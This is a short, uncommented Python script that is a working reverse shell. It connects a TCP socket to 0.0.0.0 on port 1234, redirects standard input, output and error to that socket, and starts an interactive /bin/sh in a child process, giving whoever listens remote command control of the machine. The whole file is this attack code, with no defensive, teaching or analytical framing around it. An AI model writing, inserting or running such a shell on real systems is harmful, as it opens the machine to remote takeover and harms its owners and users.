import socket,subprocess,os;
from multiprocessing import Process

def reverse():
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(("0.0.0.0",1234));
  os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  p=subprocess.call(["/bin/sh","-i"]);

if __name__ == '__main__':
    p = Process(target=reverse)
    p.start()
    p.join()
